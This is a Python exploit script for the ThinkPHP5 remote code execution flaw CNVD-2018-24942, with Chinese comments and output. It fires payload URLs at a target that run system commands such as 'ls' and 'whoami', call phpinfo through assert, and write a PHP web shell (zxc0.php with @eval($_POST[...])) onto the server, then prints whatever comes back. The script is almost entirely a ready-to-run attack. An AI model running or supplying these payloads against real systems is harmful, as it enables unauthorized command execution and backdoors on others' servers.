import sys
import time
import requests


def title():
    print("[-------------------------------------------------------------]")
    print("[----------------      ThinkPHP5 代码执行      ----------------]")
    print("[---------             CNVD-2018-24942             -----------]")
    print("[----------            Author:baige                 ----------]")
    print("[-------------------------------------------------------------]")

def main(url):
    if (len(sys.argv)==2):
        poc(url)
    else:
        print("Exmaple: \n  python3" + sys.argv[0] + "url" + "\n")

def poc(url):
    
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    }
    # vulfocus 
    poc1 = url + r"?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls"
    
    # 版本号：5.0.7~5.0.23
    poc2 = url + r"?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
    
    # 版本号：5.0.8~5.0.19
    #poc3 = url + r"?s=whoami&_method=__construct&filter&filter=system"
    
    # 版本号：5.0.20~5.0.23
    #poc4 = url + r"_method=__construct&filter[]=system&method=get&server[REQUSET_METHOD]=whoami"
    
    # 5.0.x php版本>=5.4:
    poc5 = url + r"?s=index/\\think\\template\driver\\file/write&cacheFile=zxc0.php&content=<?php @eval($_POST[xxxxxx]);?>"
    # poc5 = url + r"/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=zxc1.php&vars[1][]=<?php @eval($_POST[xxxxxx]);?>"
    # poc5 = url + r"/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo \'<?php @eval($_POST[xxxxxx]);?>\'>zxc2.php"
    
    # 5.1.x php版本>5.5:
    poc6 = url + r"?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
    # poc6 = url + r"?s=index/think\request/input?data[]=phpinfo()&filter=assert"
    # poc6 = url + r"?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=<?php%20phpinfo();?>"
    
    
    # if status == 404 and "系统发生错误" in text1:
    #lists = [poc1,poc2,poc3,poc4,poc5,poc6]
    lists = [poc1,poc2,poc5,poc6]
    proxy = {
        "http":"http://127.0.0.1:7890"
    }
    for list in lists:
        req = requests.get(list,headers=header,proxies=proxy,timeout=2)
        print("测试poc中...")
        print("Target",list)
        time.sleep(2)
        if "phpinfo" in req.text:
            print("目标命中，存在漏洞，可查看phpinfo信息")
            print("漏洞利用方式:" + list)
            print("")
        elif req.status_code == 200:
            print("存在漏洞，可执行系统命令")
            print(r"输出结果为: ",req.text)
            print("")
        else:
            print("可能没有此漏洞")
            print("继续验证其他框架版本")
            print("")
 
           
if __name__ == '__main__':
    title()
    url = sys.argv[1]
    main(url)
    
    

